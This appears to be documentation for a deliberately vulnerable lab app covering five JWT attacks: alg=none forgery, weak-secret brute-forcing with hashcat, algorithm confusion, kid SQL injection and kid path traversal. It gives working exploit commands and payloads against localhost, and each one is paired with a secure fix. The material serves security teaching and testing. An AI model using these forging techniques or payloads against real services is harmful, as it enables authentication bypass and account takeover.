# JWT (JSON Web Token) Vulnerabilities

> [!CAUTION]
> **CRITICAL SECURITY VULNERABILITIES** - For educational/testing purposes only. Never use in production.

## Overview

Implemented **5 major JWT vulnerabilities** based on real-world exploits from HackerOne, OWASP, PortSwigger, and Medium security blogs. These vulnerabilities demonstrate common mistakes in JWT implementation that can lead to authentication bypass and account takeover.

---

## Vulnerabilities

### 1. JWT None Algorithm Bypass

**Severity**: Critical  
**Source**: OWASP, PortSwigger, Medium

**Vulnerability**: Server accepts JWTs with `alg: "none"`, allowing attackers to forge unsigned tokens.

**Location**: `server/src/middleware/auth.middleware.ts` - `authenticateTokenNoneAlg()`

**How It Works**:
The JWT standard includes a "none" algorithm for debugging purposes. If a server doesn't explicitly reject this algorithm, it will accept tokens without verifying their signature.

**Exploit**:
```bash
# 1. Get a valid JWT first
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password123"}'

# Response contains a valid JWT
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c2VyMTIzIn0.signature"

# 2. Decode the JWT (use jwt.io or base64 decode)
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"userId":"user123"}

# 3. Create forged token with alg=none
# New Header (base64): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# {"alg":"none","typ":"JWT"}

# New Payload (base64): eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9
# {"userId":"admin","role":"admin"}

# Forged token (note the trailing dot with no signature)
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."

# 4. Use forged token to access protected endpoint
curl -X GET http://localhost:3000/api/jwt-session/me-none-alg \
  -H "Authorization: Bearer $FORGED"

# SUCCESS - Bypassed authentication!
```

**Impact**: Complete authentication bypass. Attacker can impersonate any user, including administrators.

**Secure Implementation**:
```typescript
// Explicitly reject none algorithm
const decoded = jwt.decode(token, { complete: true });
if (decoded?.header.alg === 'none') {
    throw new Error('None algorithm not allowed');
}

// Use strict algorithm whitelist
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

---

### 2. JWT Weak Secret (Brute-forceable)

**Severity**: Critical  
**Source**: HackerOne, OWASP, PentesterLab

**Vulnerability**: JWT signed with weak, predictable secret (`secret123`) that can be brute-forced.

**Location**: 
- `server/src/middleware/auth.middleware.ts` - `authenticateTokenWeakSecret()`
- `server/src/controllers/jwt-session.controller.ts` - `loginWeakJWT()`

**Exploit**:
```bash
# 1. Login to get a JWT with weak secret
curl -X POST http://localhost:3000/api/jwt-session/login-weak-jwt \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password123"}'

# Response contains JWT signed with weak secret
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 2. Brute-force the secret using hashcat
# Save JWT to file
echo "$TOKEN" > jwt.txt

# Use hashcat with wordlist
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or use jwt_tool
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Secret found: secret123

# 3. Forge new JWT with discovered secret
# Use jwt.io or Python
import jwt
payload = {"userId": "admin", "role": "admin"}
forged_token = jwt.encode(payload, "secret123", algorithm="HS256")

# 4. Use forged token
curl -X GET http://localhost:3000/api/jwt-session/me-weak-secret \
  -H "Authorization: Bearer $forged_token"
```

**Impact**: Once secret is discovered, attacker can forge valid JWTs for any user.

**Secure Implementation**:
```typescript
// Generate cryptographically strong secret (at least 256 bits for HS256)
const crypto = require('crypto');
const JWT_SECRET = crypto.randomBytes(32).toString('hex');

// Store in environment variable, never hardcode
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) {
    throw new Error('JWT_SECRET must be at least 32 characters');
}
```

---

### 3. JWT Algorithm Confusion (RS256 → HS256)

**Severity**: Critical  
**Source**: PortSwigger, Medium, Intigriti

**Vulnerability**: Server accepts both RS256 and HS256 algorithms. Attacker can change algorithm from RS256 to HS256 and sign with the public key (which is often publicly available).

**Location**: `server/src/middleware/auth.middleware.ts` - `authenticateTokenAlgConfusion()`

**How It Works**:
- RS256 uses asymmetric encryption (public/private key pair)
- HS256 uses symmetric encryption (shared secret)
- If server uses public key to verify HS256 tokens, attacker can sign with that public key

**Exploit**:
```python
# 1. Get the public key (often available at /.well-known/jwks.json or in docs)
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWC
...
-----END PUBLIC KEY-----"""

# 2. Create forged JWT
import jwt

payload = {
    "userId": "admin",
    "role": "admin",
    "exp": 1234567890
}

# Change algorithm to HS256 and sign with public key
forged_token = jwt.encode(payload, PUBLIC_KEY, algorithm='HS256')

print(f"Forged token: {forged_token}")

# 3. Use forged token
# curl -X GET http://localhost:3000/api/jwt-session/me-alg-confusion \
#   -H "Authorization: Bearer $forged_token"
```

**Impact**: Authentication bypass, privilege escalation.

**Secure Implementation**:
```typescript
// Strictly enforce expected algorithm
jwt.verify(token, secret, { algorithms: ['HS256'] }); // Only allow HS256

// Or for RS256
jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // Only allow RS256

// Never accept multiple algorithms
```

---

### 4. JWT kid (Key ID) SQL Injection

**Severity**: Critical  
**Source**: HackerOne, Acunetix, Invicti

**Vulnerability**: The `kid` (key ID) header parameter is used in an SQL query without sanitization, allowing SQL injection.

**Location**: `server/src/middleware/jwt.middleware.ts` - `authenticateTokenKidSQLi()`

**Exploit**:
```bash
# 1. Create JWT with malicious kid parameter
# Header:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'known_secret' as secret--"
}

# Payload:
{
  "userId": "attacker",
  "role": "admin"
}

# 2. Sign with known_secret (the injected value)
import jwt
header = {"alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT 'known_secret' as secret--"}
payload = {"userId": "attacker", "role": "admin"}
forged_token = jwt.encode(payload, "known_secret", algorithm="HS256", headers=header)

# 3. Server executes:
# SELECT secret FROM keys WHERE kid = '' UNION SELECT 'known_secret' as secret--'
# Returns 'known_secret' as the signing key

# 4. Token is verified with 'known_secret' - SUCCESS!
curl -X GET http://localhost:3000/api/jwt-session/me-kid-sqli \
  -H "Authorization: Bearer $forged_token"
```

**Impact**: Authentication bypass, potential database compromise.

**Secure Implementation**:
```typescript
// Use parameterized queries
const result = await prisma.$queryRaw`
    SELECT secret FROM keys WHERE kid = ${kid}
`;

// Or use whitelist
const allowedKids = ['key1', 'key2', 'key3'];
if (!allowedKids.includes(kid)) {
    throw new Error('Invalid kid');
}
```

---

### 5. JWT kid Path Traversal

**Severity**: High  
**Source**: PortSwigger, Vaadata

**Vulnerability**: The `kid` parameter is used to construct a file path to load a signing key, allowing path traversal attacks.

**Location**: `server/src/middleware/jwt.middleware.ts` - `authenticateTokenKidPathTraversal()`

**Exploit**:
```bash
# 1. Create JWT with path traversal in kid
# Header:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null"
}

# Payload:
{
  "userId": "attacker"
}

# 2. Server tries to load key from: ./keys/../../../dev/null.pem
# Which resolves to: /dev/null
# Content of /dev/null is empty string

# 3. Sign token with empty string
import jwt
header = {"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"}
payload = {"userId": "attacker", "role": "admin"}
forged_token = jwt.encode(payload, "", algorithm="HS256", headers=header)

# 4. Use forged token
curl -X GET http://localhost:3000/api/jwt-session/me-kid-path \
  -H "Authorization: Bearer $forged_token"

# Alternative: Use known file contents
# kid: "../../../etc/hostname" (if you know the hostname)
# kid: "../../package.json" (if you know package.json content)
```

**Impact**: Authentication bypass, potential file disclosure.

**Secure Implementation**:
```typescript
// Validate kid against whitelist
const allowedKids = ['key1', 'key2', 'key3'];
if (!allowedKids.includes(kid)) {
    throw new Error('Invalid kid');
}

// Or sanitize path
const path = require('path');
const keyPath = path.join('./keys', path.basename(kid) + '.pem');

// Ensure path is within keys directory
const resolvedPath = path.resolve(keyPath);
const keysDir = path.resolve('./keys');
if (!resolvedPath.startsWith(keysDir)) {
    throw new Error('Invalid key path');
}
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/jwt-session/login-weak-jwt` | POST | Weak JWT secret |
| `/api/jwt-session/me-none-alg` | GET | None algorithm bypass |
| `/api/jwt-session/me-weak-secret` | GET | Weak secret verification |
| `/api/jwt-session/me-alg-confusion` | GET | Algorithm confusion |
| `/api/jwt-session/me-kid-sqli` | GET | kid SQL injection |
| `/api/jwt-session/me-kid-path` | GET | kid path traversal |

---

## Testing Checklist

- [ ] Test none algorithm bypass with forged unsigned token
- [ ] Brute-force weak JWT secret with hashcat
- [ ] Test algorithm confusion (RS256 → HS256)
- [ ] Test kid SQL injection with UNION SELECT
- [ ] Test kid path traversal with /dev/null
- [ ] Verify all exploits work as documented

---

## Secure Implementation Summary

1. **Reject none algorithm** - Explicitly check and reject
2. **Strong secrets** - Use crypto.randomBytes(32) minimum
3. **Strict algorithm enforcement** - Only allow one algorithm
4. **Validate kid parameter** - Use whitelist or parameterized queries
5. **Sanitize file paths** - Validate against directory traversal
6. **Use established libraries** - Don't roll your own JWT implementation
7. **Regular key rotation** - Change secrets periodically

---

## References

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [HackerOne JWT Reports](https://hackerone.com/reports?q=JWT)
- [Intigriti JWT Vulnerabilities](https://blog.intigriti.com/hacking-tools/jwt-vulnerabilities/)
